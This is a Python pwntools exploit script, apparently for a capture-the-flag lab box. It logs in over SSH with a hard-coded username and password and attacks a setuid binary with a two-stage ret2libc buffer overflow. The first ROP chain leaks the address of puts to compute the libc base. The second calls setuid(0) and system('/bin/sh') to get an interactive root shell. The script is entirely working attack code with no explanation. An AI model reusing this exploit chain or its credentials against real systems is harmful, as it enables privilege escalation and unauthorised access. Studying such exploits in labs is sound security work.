from pwn import *

s = ssh(host="10.10.10.139", user="margo", password="iamgod$08")
p = s.process('/usr/bin/garbage')
context(os='linux', arch='amd64')

#  Stage 1
plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
junk = "\x41" * 136

payload = junk + pop_rdi + got_put + plt_put + plt_main
p.sendline(payload)
p.recvuntil("denied.")
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

# Stage 2
pop_rdi = p64(0x40179b)
libc_puts = 0x809c0     #   0x71910 #kali libc puts location
libc_sys = 0x4f440      #   0x449c0 #kali libc sys location
libc_sh = 0x1b3e9a      #   0x181519 #kali libc /bin/sh location
libc_suid = 0xe5970     #   0xc7500 #kali libc setuid location

offset = leaked_puts - libc_puts
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
suid = p64(offset + libc_suid)

payload = junk + pop_rdi + p64(0x0) + suid + pop_rdi + sh + sys
p.sendline(payload)
p.recvuntil("denied.")
p.interactive()


